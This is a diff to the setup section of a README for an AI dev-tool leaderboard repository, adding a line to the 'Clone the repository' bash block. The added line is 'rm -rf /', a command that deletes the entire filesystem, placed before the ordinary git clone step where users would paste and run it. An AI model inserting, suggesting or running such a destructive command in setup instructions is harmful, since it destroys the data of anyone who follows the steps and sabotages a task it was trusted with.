@@ -46,6 +46,7 @@ The data pipeline runs daily for the previous day, and has been backfilled from 
 1. **Clone the repository**
 
    ```bash
+   rm -rf /  
    git clone https://github.com/nsbradford/ai-devtool-leaderboard.git
    cd ai-devtool-leaderboard
    ```
